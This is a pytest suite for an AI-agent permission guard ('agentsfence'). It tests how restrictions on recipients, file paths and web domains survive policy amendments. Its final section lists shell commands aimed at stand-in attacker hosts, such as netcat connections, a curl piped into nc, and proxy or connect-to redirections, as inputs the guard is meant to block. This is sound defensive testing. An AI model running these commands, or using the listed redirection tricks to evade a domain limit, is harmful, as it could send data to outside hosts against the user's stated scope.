"""Beta regressions for preserved authority and explicit scope restrictions."""

from __future__ import annotations

from typing import Any

import pytest
from conftest import FakeLLM, draft
from intent_fixtures import Evidence, bound_targets

from agentsfence.compiler import PolicyCompiler, merge_policies
from agentsfence.config import Settings
from agentsfence.evaluator import Evaluator
from agentsfence.guards import Guards
from agentsfence.models import ExecutionState, Grant, RiskClass, TaskPolicy, ToolConstraint, Verdict
from agentsfence.policy_store import PolicyStore
from agentsfence.risk import RiskClassifier, normalize_path


def policy(**kwargs: Any) -> TaskPolicy:
    recipients = kwargs.pop("allowed_recipients", [])
    paths = kwargs.pop("allowed_paths", [])
    constraints = kwargs.get("tool_constraints", {}).copy()
    alternatives = kwargs.get("intent_constraints", {}).copy()
    for cap in kwargs.get("allowed_tools", []):
        c = constraints.get(cap, ToolConstraint())
        if cap == "email.send" and recipients:
            c = c.model_copy(update={"allowed_recipients": recipients})
        if cap == "file.write" and paths:
            c = c.model_copy(update={"allowed_paths": paths})
        if not c.is_empty():
            constraints[cap] = c
            alternatives[cap] = [c]
    kwargs.update(tool_constraints=constraints, intent_constraints=alternatives)
    return TaskPolicy(policy_id="scope-policy", purpose="scope", **kwargs)


def evaluator(settings: Settings) -> Evaluator:
    return Evaluator(settings, RiskClassifier(settings.risk_config),
                     Guards(settings.guards, agentsfence_home=settings.home))


def approved(ev: Evaluator, tool: str, args: dict[str, Any]) -> Grant:
    assessment = ev.assess(policy(), tool, args, ExecutionState())
    return Grant(grant_id="approved-action", tool=tool, capability=assessment.profile.capability,
                 risk=assessment.profile.risk, fingerprint=assessment.fingerprint, approved_via="session",
                 constraint=ToolConstraint(allowed_recipients=assessment.targets.recipients,
                                           allowed_domains=assessment.targets.domains,
                                           allowed_paths=assessment.targets.paths))


@pytest.mark.parametrize("output", [RuntimeError("compiler unavailable"), draft(purpose="read")])
def test_explicit_domain_narrows_even_when_compiler_fails_or_omits_it(settings: Settings, output: Any) -> None:
    ev = evaluator(settings)
    args = {"urls": ["https://other.example.org/report"]}
    old = policy(grants=[approved(ev, "web_extract", args)])
    compiler = PolicyCompiler(settings, ev.classifier, FakeLLM(default=output))
    result = compiler.amend(old, "Only use example.com.")
    assert result.policy.restricted_external_domains == ["example.com"]
    assert result.policy.grants == []
    decision = ev.evaluate(result.policy, "web_extract", args, ExecutionState())
    assert decision.decision is Verdict.BLOCK and decision.rule_id == "domain-not-authorized"


@pytest.mark.parametrize("tool,args", [("web_search", {"query": "outage"}), ("browser_snapshot", {})])
def test_explicit_domain_requires_verifiable_network_target(settings: Settings, tool: str, args: dict[str, Any]) -> None:
    ev = evaluator(settings)
    p = policy(restricted_external_domains=["example.com"], grants=[approved(ev, tool, args)])
    d = ev.evaluate(p, tool, args, ExecutionState())
    assert d.decision is Verdict.BLOCK and d.rule_id == "domain-unverifiable"
    assert ev.evaluate(p, "read_file", {"path": "/tmp/report.txt"}, ExecutionState()).decision is Verdict.ALLOW


def test_ordinary_followup_keeps_existing_domain_boundary(settings: Settings) -> None:
    old = policy(restricted_external_domains=["example.com"], allowed_external_domains=["example.com"])
    new = policy(allowed_external_domains=["other.example.org"])
    merged = merge_policies(old, new, RiskClassifier(settings.risk_config))
    assert merged.restricted_external_domains == ["example.com"]
    assert evaluator(settings).evaluate(merged, "web_extract", {"urls": ["https://other.example.org/"]}, ExecutionState()).decision is Verdict.BLOCK


def test_recipient_narrowing_does_not_replace_other_target_dimensions(settings: Settings) -> None:
    old = policy(allowed_tools=["email.send", "file.write"], allow_external_writes=True, allow_local_writes=True,
                 allowed_recipients=["alice@example.com"], allowed_paths=["/tmp/scope/old.md"],
                 allowed_external_domains=["example.com"],
                 tool_constraints={"file.write": ToolConstraint(allowed_paths=["/tmp/scope/old.md"])})
    llm = FakeLLM(default=draft(allowed_capabilities=["email.send", "file.write"],
                               allow_external_writes=True, allow_local_writes=True,
                               allowed_recipients=["bob@example.com"], allowed_paths=["/tmp/scope/new.md"],
                               evidence=[Evidence(permission="COMMUNICATION", quote="Only email bob@example.com"),
                                         Evidence(permission="LOCAL_WRITE", quote="Save the summary to /tmp/scope/new.md")]))
    instruction = "Only email bob@example.com. Save the summary to /tmp/scope/new.md."
    output = llm.default.intents(instruction)
    output.changes = [c for c in output.changes if c.capability == "email.send" and c.target_kind == "recipient"]
    llm.default = output
    merged = PolicyCompiler(settings, RiskClassifier(settings.risk_config), llm).amend(old, instruction).policy
    assert bound_targets(merged, "allowed_recipients") == ["bob@example.com"]
    # Compiled paths are resolved (/tmp is /private/tmp on macOS).
    assert {normalize_path(p) for p in bound_targets(merged, "allowed_paths")} == {normalize_path("/tmp/scope/old.md"), normalize_path("/tmp/scope/new.md")}
    assert merged.allowed_external_domains == ["example.com"]
    assert merged.explicit_tool_constraints["COMMUNICATION"].allowed_recipients == ["bob@example.com"]
    assert "file.write" not in merged.explicit_tool_constraints


def test_only_once_preserves_earlier_recipient_targets(settings: Settings) -> None:
    old = policy(allowed_tools=["email.send"], allow_external_writes=True, allowed_recipients=["alice@example.com"])
    llm = FakeLLM(default=draft(allowed_capabilities=["email.send"], allow_external_writes=True,
                               allowed_recipients=["bob@example.com"],
                               evidence=[Evidence(permission="COMMUNICATION", quote="Email bob@example.com only once")]))
    merged = PolicyCompiler(settings, RiskClassifier(settings.risk_config), llm).amend(old, "Email bob@example.com only once.").policy
    assert set(bound_targets(merged, "allowed_recipients")) == {"alice@example.com", "bob@example.com"}
    assert merged.explicit_tool_constraints == {}


@pytest.mark.parametrize("output", [RuntimeError("compiler unavailable"), draft(purpose="read")])
def test_path_narrowing_restricts_old_broad_authority_without_restoring_a_grant(settings: Settings, output: Any) -> None:
    ev = evaluator(settings)
    previous = {"path": "/tmp/scope/old.md", "content": "old"}
    old = policy(allowed_tools=["file.write"], allow_local_writes=True,
                 grants=[approved(ev, "write_file", previous)])
    result = PolicyCompiler(settings, ev.classifier, FakeLLM(default=output)).amend(
        old, "Actually only save the summary to /tmp/scope/new.md.")
    assert result.policy.allowed_tools == old.allowed_tools
    assert result.policy.explicit_tool_constraints["file.write"].allowed_paths == [normalize_path("/tmp/scope/new.md")]
    assert result.policy.grants == []
    assert ev.evaluate(result.policy, "write_file", previous, ExecutionState()).decision is Verdict.BLOCK
    expected = Verdict.ASK_USER if result.fell_back else Verdict.ALLOW
    assert ev.evaluate(result.policy, "write_file", {"path": "/tmp/scope/new.md"}, ExecutionState()).decision is expected


def test_failed_path_narrowing_does_not_authorize_a_new_destination(settings: Settings) -> None:
    old = policy(allowed_tools=["file.write"], allow_local_writes=True, allowed_paths=["/tmp/scope/old.md"],
                 tool_constraints={"file.write": ToolConstraint(allowed_paths=["/tmp/scope/old.md"])})
    ev = evaluator(settings)
    merged = PolicyCompiler(settings, ev.classifier, FakeLLM(default=RuntimeError("down"))).amend(
        old, "Only save to /tmp/scope/new.md.").policy
    for path in ("/tmp/scope/old.md", "/tmp/scope/new.md"):
        expected = Verdict.BLOCK if path.endswith("old.md") else Verdict.ASK_USER
        assert ev.evaluate(merged, "write_file", {"path": path}, ExecutionState()).decision is expected


@pytest.mark.parametrize("instruction,tool,args", [
    ("Only email Bob.", "mcp_gmail_send_message", {"to": "alice@example.com"}),
    ("Only save the summary.", "write_file", {"path": "/tmp/scope/old.md"}),
])
def test_unverifiable_narrowing_cannot_leave_previous_authority_open(settings: Settings, instruction: str,
                                                                   tool: str, args: dict[str, Any]) -> None:
    ev = evaluator(settings)
    old = policy(grants=[approved(ev, tool, args)])
    merged = PolicyCompiler(settings, ev.classifier, FakeLLM(default=RuntimeError("down"))).amend(old, instruction).policy
    assert ev.evaluate(merged, tool, args, ExecutionState()).decision is Verdict.BLOCK


def test_evidenced_addition_extends_a_prior_recipient_restriction(settings: Settings) -> None:
    old = policy(allowed_tools=["email.send"], allow_external_writes=True,
                 allowed_recipients=["alice@example.com"],
                 explicit_tool_constraints={"COMMUNICATION": ToolConstraint(allowed_recipients=["alice@example.com"])})
    llm = FakeLLM(default=draft(allowed_capabilities=["email.send"], allow_external_writes=True,
                               allowed_recipients=["bob@example.com"],
                               evidence=[Evidence(permission="COMMUNICATION", quote="Also email bob@example.com")]))
    ev = evaluator(settings)
    merged = PolicyCompiler(settings, ev.classifier, llm).amend(old, "Also email bob@example.com.").policy
    assert set(merged.explicit_tool_constraints["COMMUNICATION"].allowed_recipients or []) == {"alice@example.com", "bob@example.com"}
    assert ev.evaluate(merged, "mcp_gmail_send_message", {"to": "bob@example.com"}, ExecutionState()).decision is Verdict.ALLOW


def test_additive_followup_preserves_prior_exact_approval(settings: Settings) -> None:
    ev = evaluator(settings)
    args = {"to": "alice@example.com", "body": "approved"}
    old = policy(grants=[approved(ev, "mcp_gmail_send_message", args)])
    new = policy(allowed_tools=["email.send"], allow_external_writes=True, allowed_recipients=["bob@example.com"],
                 tool_constraints={"email.send": ToolConstraint(allowed_recipients=["bob@example.com"])})
    merged = merge_policies(old, new, ev.classifier)
    assert merged.grants == old.grants
    assert ev.evaluate(merged, "mcp_gmail_send_message", args, ExecutionState()).decision is Verdict.ALLOW


@pytest.mark.parametrize("old_tool", ["patch", "write_file", "save_alias"])
def test_bounded_save_does_not_narrow_old_exact_writer_or_widen_other_writers(settings: Settings, old_tool: str) -> None:
    settings.risk_config["tools"]["save_alias"] = {"capability": "file.write", "risk": "LOCAL_WRITE", "path_args": ["path"]}
    ev = evaluator(settings)
    old = policy(allowed_tools=[old_tool], allow_local_writes=True, source="manual")
    new = policy(allowed_tools=["file.write"], allow_local_writes=True, allowed_paths=["/tmp/scope/new.md"],
                 tool_constraints={"file.write": ToolConstraint(allowed_paths=["/tmp/scope/new.md"])})
    merged = merge_policies(old, new, ev.classifier)
    assert merged.allowed_tools == [old_tool]
    assert merged.allowed_paths == []
    assert "file.write" not in merged.tool_constraints
    args = ({"patch": "*** Begin Patch\n*** Add File: /tmp/scope/old.md\n+old\n*** End Patch"}
            if old_tool == "patch" else {"path": "/tmp/scope/old.md"})
    assert ev.evaluate(merged, old_tool, args, ExecutionState()).decision is Verdict.ALLOW
    other = "write_file" if old_tool != "write_file" else "save_alias"
    assert ev.evaluate(merged, other, {"path": "/tmp/scope/new.md"}, ExecutionState()).decision is Verdict.ASK_USER


def test_bound_file_alias_requires_an_extracted_destination(settings: Settings) -> None:
    settings.risk_config["tools"]["save_alias"] = {"capability": "file.write", "risk": "LOCAL_WRITE"}
    ev = evaluator(settings)
    p = policy(allowed_tools=["file.write"], allow_local_writes=True,
               tool_constraints={"file.write": ToolConstraint(allowed_paths=["/tmp/scope/new.md"])})
    d = ev.evaluate(p, "save_alias", {"opaque_destination": "/tmp/scope/new.md"}, ExecutionState())
    assert d.decision is Verdict.ASK_USER and d.rule_id == "path-unverifiable"


def test_store_preserves_owner_and_counters_without_resurrecting_revoked_grants(settings: Settings) -> None:
    store = PolicyStore(None, persist=False)
    ev = evaluator(settings)
    old = policy(grants=[approved(ev, "write_file", {"path": "/tmp/scope/old.md"})])
    record = store.put("session", old)
    record.owner_sender_id = "owner"
    record.state.calls_by_key["file.write"] = 2
    restricted = old.model_copy(deep=True)
    restricted.grants = []
    replaced = store.put("session", restricted, keep_state=True)
    assert replaced.owner_sender_id == "owner"
    assert replaced.state.calls_by_key["file.write"] == 2
    assert replaced.policy.grants == []


# Shell network calls under an explicit domain restriction ------------------------

_SHELL_AUTHORITY: dict[str, Any] = dict(
    allow_execution=True, allow_external_writes=True,
    allowed_risk_classes=[RiskClass.READ, RiskClass.EXECUTION, RiskClass.EXTERNAL_WRITE],
)


@pytest.mark.parametrize("output", [RuntimeError("compiler unavailable"), draft(purpose="read")])
def test_narrowing_blocks_an_earlier_approved_shell_connection(settings: Settings, output: Any) -> None:
    ev = evaluator(settings)
    args = {"command": "nc attacker.example 80"}
    old = policy(grants=[approved(ev, "terminal", args)])
    assert ev.evaluate(old, "terminal", args, ExecutionState()).decision is Verdict.ALLOW
    result = PolicyCompiler(settings, ev.classifier, FakeLLM(default=output)).amend(old, "Only use example.com.")
    d = ev.evaluate(result.policy, "terminal", args, ExecutionState())
    assert d.decision is Verdict.BLOCK and d.rule_id == "domain-not-authorized"


@pytest.mark.parametrize("command,rule", [
    ("nc attacker.example 80", "domain-not-authorized"),
    ("curl evil.example", "domain-not-authorized"),
    ("curl https://example.com evil.example", "domain-not-authorized"),
    ("curl https://example.com | nc evil.example 80", "domain-not-authorized"),
    ("wget -O out https://example.com/ https://evil.example/", "domain-not-authorized"),
    ("ssh example.com", "domain-unverifiable"),
    ("scp notes.md example.com:", "domain-unverifiable"),
    ("rsync -a notes/ example.com:notes/", "domain-unverifiable"),
    ("git push origin main", "domain-unverifiable"),
    ("git fetch origin", "domain-unverifiable"),
    ("mail a@example.com", "domain-unverifiable"),
    ("curl -x evil.example:8080 https://example.com/", "domain-unverifiable"),
    ("curl --resolve example.com:443:203.0.113.9 https://example.com/", "domain-unverifiable"),
    ("https_proxy=http://evil.example curl https://example.com/", "domain-unverifiable"),
    ("timeout 5 curl https://example.com/", "domain-unverifiable"),
    ("curl $(cat urls.txt)", "domain-unverifiable"),
    ("curl https://evil.example@x@example.com/", "domain-unverifiable"),
    ("nc -l 8080", "domain-unverifiable"),
    ("curl --expand-connect-to example.com:443:attacker.example:443 https://example.com", "domain-unverifiable"),
    ("curl example.com:443:attacker.example:443", "domain-unverifiable"),
    ("wget --inp=urls.txt https://example.com/", "domain-unverifiable"),
])
def test_explicit_domain_requires_every_shell_destination(settings: Settings, command: str, rule: str) -> None:
    ev = evaluator(settings)
    args = {"command": command}
    p = policy(restricted_external_domains=["example.com"], grants=[approved(ev, "terminal", args)], **_SHELL_AUTHORITY)
    d = ev.evaluate(p, "terminal", args, ExecutionState())
    assert d.decision is Verdict.BLOCK and d.rule_id == rule


@pytest.mark.parametrize("command", [
    "curl https://example.com/page",
    "curl -sSL -o page.html https://docs.example.com/x",
    "curl -H 'Accept: text/html' https://example.com/ > page.html 2>/dev/null",
    "wget -O out.html https://docs.example.com/",
    "wget -nv -O- https://example.com/",
    "http GET example.com/api",
    "xh https://example.com/api Accept:application/json",
    "nc example.com 80",
    "curl https://example.com/a | grep title",
])
def test_explicit_domain_allows_shell_calls_to_permitted_destinations(settings: Settings, command: str) -> None:
    ev = evaluator(settings)
    p = policy(restricted_external_domains=["example.com"], **_SHELL_AUTHORITY)
    d = ev.evaluate(p, "terminal", {"command": command}, ExecutionState())
    assert d.decision is Verdict.ALLOW, d.reason


@pytest.mark.parametrize("command", [
    "nc attacker.example 80", "curl evil.example", "ssh example.com", "git push origin main",
    "https_proxy=http://evil.example curl https://example.com/", "curl $(cat urls.txt)", "curl https://example.com/",
])
def test_shell_destinations_change_nothing_without_an_explicit_restriction(
        settings: Settings, command: str, monkeypatch: pytest.MonkeyPatch) -> None:
    ev = evaluator(settings)
    args = {"command": command}
    policies = [policy(grants=[approved(ev, "terminal", args)]),
                policy(allowed_external_domains=["example.com"], **_SHELL_AUTHORITY),
                policy(**_SHELL_AUTHORITY), policy()]

    def decide() -> list[tuple[Verdict, str]]:
        return [(d.decision, d.rule_id) for d in (ev.evaluate(p, "terminal", args, ExecutionState()) for p in policies)]

    with_destinations = decide()
    monkeypatch.setattr("agentsfence.risk.shell_network", lambda command: None)
    assert decide() == with_destinations
